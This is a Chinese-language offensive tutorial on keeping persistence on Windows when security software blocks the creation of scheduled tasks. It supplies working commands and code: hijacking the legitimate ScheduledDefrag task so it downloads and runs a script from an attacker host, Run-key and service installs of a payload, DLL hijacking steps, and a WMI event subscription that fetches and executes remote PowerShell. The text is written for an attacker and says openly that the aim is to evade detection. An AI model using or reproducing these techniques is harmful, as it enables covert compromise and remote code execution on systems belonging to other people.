### 计划任务被拦截了怎么办

**1. 放弃创建，寻找修改或利用已有的计划任务**

安全软件通常只监控**创建新任务**的行为，但可能不会对**修改已有任务**的行为进行强拦截，尤其是那些系统或合法程序创建的计划任务

- **攻击原理**：找到一个不显眼的、定期执行的、且权限足够高的系统任务，然后修改它的执行命令，让它在执行原有任务的同时，也执行你的恶意代码

- **操作步骤**：

  1. **信息收集**：首先，使用 `schtasks /query /fo list /v` 命令来列出所有已有的计划任务。你需要关注以下几点：

     - **任务名称**：寻找那些看起来合法、不引人注意的任务，例如与系统更新、日志清理相关的任务
     - **执行账户**：寻找那些以 `SYSTEM` 或 `Administrator` 权限运行的任务
     - **触发器**：了解任务的触发频率（例如每天、每周）

  2. **修改任务**：使用 `schtasks /change` 命令来修改任务的执行命令

     ```powershell
     # 示例：修改一个名为“Microsoft\Windows\Defrag\ScheduledDefrag”的合法任务
     schtasks /change /tn "Microsoft\Windows\Defrag\ScheduledDefrag" /tr "powershell.exe -c \"iwr http://<攻击机IP>/shell.ps1 -OutFile C:\temp\shell.ps1; Start-Process C:\temp\shell.ps1\""
     ```

  - **优点**：这种方法利用了合法任务的“信任”，行为更加隐蔽，不容易被安全软件识别为恶意创建行为

**2. 利用启动项或服务进行权限维持**

如果计划任务的路走不通，启动项和服务是另一个值得尝试的切入点

- **利用注册表启动项**：许多应用程序都通过注册表键值来实现开机自启动。安全软件可能会监控这些键值的创建，但你可以尝试修改一些不那么敏感的键值

  - **常见路径**：

    - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
    - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`

  - **操作步骤**：

    ```powershell
    # 在注册表Run键中添加一个启动项
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyUpdater" /t REG_SZ /d "C:\Users\Public\payload.exe" /f
    ```

  - **缺点**：这种方法非常常见，很容易被安全软件拦截。你需要使用更隐蔽的键值或利用无文件方式

- **利用服务**：Windows 服务可以以高权限运行，并且可以配置为开机自启动

  - **操作步骤**：

    ```powershell
    # 创建一个新的服务
    sc create MyService binPath= "C:\Users\Public\payload.exe" start= auto
    # 启动服务
    sc start MyService
    ```

  - **缺点**：创建新服务同样是一个非常敏感的操作，几乎所有的安全软件都会进行拦截

**3. 使用无文件和内存驻留技术**

这是在高级防护环境下最有效的权限维持方法，因为它完全绕过了文件系统和注册表的监控

- **DLL 劫持**：找到一个经常被合法程序调用的、但路径可写的 DLL 文件，将你的恶意代码注入到这个 DLL 中

  - **操作步骤**：
    1. 找到一个合法程序（例如 `c:\Program Files\Google\Chrome\Application\chrome.exe`）启动时会去加载的 DLL
    2. 将你自己的恶意 DLL 文件命名为相同的名字，并放置在程序会优先寻找的路径中。
    3. 当用户启动这个程序时，你的恶意 DLL 就会被加载并执行，从而实现权限维持
  - **优点**：这种方法非常隐蔽，因为执行的是合法程序，绕过了许多行为监控

- **WMI/COM 持久化**：利用 Windows Management Instrumentation (WMI) 或 Component Object Model (COM) 实现持久化

  - **原理**：你可以创建一个 WMI 事件订阅，当某个特定事件发生时（例如系统启动），自动触发执行你的恶意代码

  - **操作步骤**：

    ```powershell
    # 创建一个WMI事件过滤器，当系统启动时触发
    $filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"} -ErrorAction Stop
    # 创建一个WMI事件消费者，执行你的恶意代码
    $consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{Name="myconsumer"; CommandLineTemplate="powershell.exe -c 'iwr http://<攻击机IP>/shell.ps1|iex'"} -ErrorAction Stop
    # 将过滤器和消费者绑定
    $binding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=$filter; Consumer=$consumer} -ErrorAction Stop
    ```

  - **优点**：这是最高级的无文件持久化技术，非常难以被检测